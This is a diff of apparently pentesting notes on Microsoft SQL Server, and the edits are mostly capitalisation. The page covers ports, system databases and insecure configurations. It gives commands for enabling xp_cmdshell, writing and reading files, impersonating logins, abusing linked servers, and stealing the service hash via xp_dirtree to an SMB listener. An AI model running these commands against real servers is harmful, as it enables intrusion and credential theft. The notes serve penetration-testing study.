@@ -50,79 +50,79 @@
     
     <h1>MSSQL</h1>
 
-<h2>main points</h2>
+<h2>Main points</h2>
 
 <ul>
-<li>Microsoft SQL</li>
-<li>closed source</li>
-<li>uses port TCP 1433</li>
-<li>when using hidden mode, uses port TCP 2433</li>
-<li>popular with apps built with .NET</li>
-<li>designed for windows but possible to run it on linux and macos</li>
-<li>most common client is SQL Server Management Studio (SSMS)</li>
-<li>others include <code>mssql-cli</code>, <code>sql server powershell</code>, <code>heidisql</code>, etc</li>
-<li>most useful client for pentesters is probably <code>mssqlclient.py</code> from impacket</li>
+<li>Microsoft SQL.</li>
+<li>Closed source.</li>
+<li>Uses port TCP 1433.</li>
+<li>When using hidden mode, uses port TCP 2433.</li>
+<li>Popular with apps built with .NET.</li>
+<li>Designed for Windows but possible to run it on Linux and macOS.</li>
+<li>Most common client is SQL Server Management Studio (SSMS).</li>
+<li>Others include <code>mssql-cli</code>, <code>sql server powershell</code>, <code>heidisql</code>, etc.</li>
+<li>Most useful client for pentesters is probably <code>mssqlclient.py</code> from impacket.</li>
 </ul>
 
-<h2>default system databases</h2>
+<h2>Default system databases</h2>
 
 <table><thead>
 <tr>
-<th>default system database</th>
-<th>description</th>
+<th>Default system database</th>
+<th>Description</th>
 </tr>
 </thead><tbody>
 <tr>
 <td>master</td>
-<td>all system info for sql server instance</td>
+<td>All system info for SQL server instance.</td>
 </tr>
 <tr>
 <td>model</td>
-<td>template used for every new database created</td>
+<td>Template used for every new database created.</td>
 </tr>
 <tr>
 <td>msdb</td>
-<td>database for job scheduling and alerts</td>
+<td>Database for job scheduling and alerts.</td>
 </tr>
 <tr>
 <td>tempdb</td>
-<td>temporary objects</td>
+<td>Temporary objects.</td>
 </tr>
 <tr>
 <td>resource</td>
-<td>system objects included in SQL server, read-only</td>
+<td>System objects included in SQL server, read-only.</td>
 </tr>
 </tbody></table>
 
-<h2>insecure configuration</h2>
+<h2>Insecure configuration</h2>
 
-<p>the SQL service often runs as <code>NT SERVICE\MSSQLSERVER</code>. the login request can only be done from windows authentication, which uses the local SAM database or the domain controller to allow access.</p>
+<p>The SQL service often runs as <code>NT SERVICE\MSSQLSERVER</code>. The login request can only be done from Windows authentication, which uses the local SAM database or the domain controller to allow access.</p>
 
-<p>look into encryption being disabled between MSSQL clients and servers, self-signed certificates that could be spoofed, named pipes, weak credentials and default <code>sa</code> credentials.</p>
+<p>Look into encryption being disabled between MSSQL clients and servers, self-signed certificates that could be spoofed, named pipes, weak credentials and default <code>sa</code> credentials.</p>
 
-<h2>commands</h2>
+<h2>Commands</h2>
 
-<div class="highlight"><pre class="highlight shell"><code><span class="c"># connect to MSSQL on linux with SQL authentication</span>
+<div class="highlight"><pre class="highlight shell"><code><span class="c"># Connect to MSSQL on Linux with SQL authentication:</span>
 sqsh <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-P</span> &lt;password&gt;
 
-<span class="c"># connect to MSSQL on linux with windows authentication</span>
+<span class="c"># Connect to MSSQL on Linux with Windows authentication:</span>
 <span class="c"># the .\\ notation is used for a local account</span>
 sqsh <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> .<span class="se">\\</span>&lt;username&gt; <span class="nt">-P</span> &lt;password&gt;
 
-<span class="c"># connect to MSSQL on windows</span>
+<span class="c"># Connect to MSSQL on Windows:</span>
 sqlcmd <span class="nt">-S</span> &lt;IP address&gt; <span class="nt">-U</span> &lt;username&gt; <span class="nt">-P</span> &lt;password&gt;
 
-<span class="c"># in MSSQL prompt, execute system commands with xp_cmdshell</span>
-<span class="c"># this is rarely enabled but worth a try</span>
+<span class="c"># In MSSQL prompt, execute system commands with xp_cmdshell.</span>
+<span class="c"># This is rarely enabled but worth a try:</span>
 xp_cmdshell <span class="s1">'whoami'</span>
 GO <span class="c"># necessary to process commands with sqlcmd</span>
 
 <span class="c">############</span>
-<span class="c"># if xp_cmdshell is not enabled with we have proper permissions</span>
+<span class="c"># If xp_cmdshell is not enabled while we have the proper permissions</span>
 <span class="c"># to change that, enable it:</span>
 
-<span class="c"># allow advanced options to be changed</span>
-<span class="c"># and enable xp_cmdshell</span>
+<span class="c"># Allow advanced options to be changed</span>
+<span class="c"># and enable xp_cmdshell:</span>
 EXECUTE sp_configure <span class="s1">'show advanced options'</span>, 1
 GO
 RECONFIGURE
@@ -134,9 +134,9 @@ GO
 <span class="c">############</span>
 
 <span class="c">############</span>
-<span class="c"># enable writing files with MSSQL if you have admin privileges:</span>
+<span class="c"># Enable writing files with MSSQL if you have admin privileges:</span>
 
-<span class="c"># for this, enable ole automation procedures</span>
+<span class="c"># For this, enable ole automation procedures:</span>
 sp_configure <span class="s1">'show advanced options'</span>, 1
 GO
 RECONFIGURE
@@ -146,8 +146,8 @@ GO
 RECONFIGURE
 GO
 
-<span class="c"># then, create a file</span>
-<span class="c"># a very simple and easy to remember process!</span>
+<span class="c"># Then, create a file.</span>
+<span class="c"># A very simple and easy to remember process!</span>
 DECLARE @OLE INT
 DECLARE @FileID INT
 EXECUTE sp_OACreate <span class="s1">'Scripting.FileSystemObject'</span>, @OLE OUT
@@ -159,11 +159,11 @@ GO
 <span class="c">############</span>
 
 <span class="c">############</span>
-<span class="c"># leveraging the impersonate permission, which allows</span>
-<span class="c"># you to take the permissions of another user. what</span>
+<span class="c"># Leveraging the impersonate permission, which allows</span>
+<span class="c"># you to take the permissions of another user. What</span>
 <span class="c"># could possibly go wrong?</span>
 
-<span class="c"># identify users that you can impersonate</span>
+<span class="c"># Identify users that you can impersonate:</span>
 SELECT distinct b.name
 FROM sys.server_permissions a
 INNER JOIN sys.server_principals b
@@ -171,60 +171,60 @@ ON a.grantor_principal_id <span class="o">=</span> b.principal_id
 WHERE a.permission_name <span class="o">=</span> <span class="s1">'IMPERSONATE'</span>
 GO
 
-<span class="c"># verify current user and associated role</span>
+<span class="c"># Verify current user and associated role:</span>
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
 GO
 
-<span class="c"># impersonate a user</span>
-<span class="c"># run this within the master DB,</span>
-<span class="c"># as everyone as access to it.</span>
+<span class="c"># Impersonate a user.</span>
+<span class="c"># Run this within the master DB,</span>
+<span class="c"># as everyone as access to it:</span>
 EXECUTE AS LOGIN <span class="o">=</span> <span class="s1">'&lt;username&gt;'</span>
 SELECT SYSTEM_USER
 SELECT IS_SRVROLEMEMBER<span class="o">(</span><span class="s1">'sysadmin'</span><span class="o">)</span>
 GO
 
-<span class="c"># use REVERT to quit impersonation</span>
+<span class="c"># Use REVERT to quit impersonation:</span>
 REVERT
 GO
 <span class="c">############</span>
 
 <span class="c">############</span>
-<span class="c"># leveraging the linked servers configuration, which</span>
+<span class="c"># Leveraging the linked servers configuration, which</span>
 <span class="c"># allows you to execute statements to external, but</span>
 <span class="c"># linked SQL servers or other database products.</span>
-<span class="c"># what could possibly go wrong?</span>
+<span class="c"># What could possibly go wrong?</span>
 
-<span class="c"># identify linked servers in MSSQL</span>
+<span class="c"># Identify linked servers in MSSQL:</span>
 SELECT srvname, isremote FROM sysservers
 GO
 
-<span class="c"># identify the user used for the connection between</span>
-<span class="c"># the servers</span>
+<span class="c"># Identify the user used for the connection between</span>
+<span class="c"># the servers:</span>
 EXECUTE<span class="o">(</span><span class="s1">'select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')'</span><span class="o">)</span> AT <span class="o">[</span>&lt;IP address&gt;<span class="se">\&lt;</span>server name&gt;]
 GO
 <span class="c">############</span>
 
-<span class="c"># read file with MSSQL, according to your system permissions</span>
+<span class="c"># Read file with MSSQL, according to your system permissions:</span>
 SELECT <span class="k">*</span> FROM OPENROWSET<span class="o">(</span>BULK N<span class="s1">'C:/&lt;path&gt;'</span>, SINGLE_CLOB<span class="o">)</span>
 GO
 
-<span class="c"># scan MSSQL server with nmap</span>
+<span class="c"># Scan MSSQL server with nmap:</span>
 <span class="nb">sudo </span>nmap <span class="nt">--script</span> ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes <span class="nt">--script-args</span> mssql.instance-port<span class="o">=</span>1433,mssql.username<span class="o">=</span>sa,mssql.password<span class="o">=</span>,mssql.instance-name<span class="o">=</span>MSSQLSERVER <span class="nt">-sV</span> <span class="nt">-p</span> 1433 &lt;IP address&gt;
 
-<span class="c"># login with mssqlclient.py</span>
+<span class="c"># Login with mssqlclient.py:</span>
 python3 mssqlclient.py &lt;username&gt;@&lt;IP address&gt; <span class="nt">-windows-auth</span>
 
-<span class="c"># with responder or impacket-smbserver listening, steal MSSQL service hash</span>
+<span class="c"># With responder or impacket-smbserver listening, steal MSSQL service hash:</span>
 EXEC master..xp_dirtree <span class="s1">'\\&lt;IP address&gt;\share\'</span>
 GO
 
-<span class="c"># or alternatively</span>
+<span class="c"># Or alternatively:</span>
 EXEC master..xp_subdirs <span class="s1">'\\&lt;IP address&gt;\share\'</span>
 GO
 </code></pre></div>
 
-<h2>references</h2>
+<h2>References</h2>
 
 <ul>
 <li><a href="https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15" rel="nofollow">https://docs.microsoft.com/en-us/sql/relational-databases/databases/system-databases?view=sql-server-ver15</a></li>
